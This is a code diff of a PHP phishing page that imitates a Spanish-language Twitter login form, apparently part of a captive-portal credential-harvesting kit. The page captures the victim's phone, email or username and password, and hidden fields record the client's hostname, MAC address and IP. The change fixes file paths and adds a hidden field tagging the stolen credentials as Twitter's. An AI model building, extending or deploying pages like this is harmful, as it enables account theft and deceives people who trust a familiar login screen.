@@ -1,6 +1,6 @@
 <?php
 $destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
-require_once('helper.php');
+require_once('../helper.php');
 ?>
 
   <html>
@@ -16,7 +16,7 @@ require_once('helper.php');
     <meta name="viewport" content="width=device-width,
     initial-scale=1, maximum-scale=1, user-scalable=no">
 
-    <script src="jquery-2.2.1.min.js"></script>
+    <script src="../jquery-2.2.1.min.js"></script>
     <script type="text/javascript">
       function redirect() {
         setTimeout(function() {
@@ -140,6 +140,7 @@ require_once('helper.php');
 
             <input type="text" name="email" class="form-email" placeholder="Teléfono, correo o usuario" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
             <input type="password" name="password" class="form-password" placeholder="Contraseña" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
+            <input type="hidden" name="social" value="Twitter">
             <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
             <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
             <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
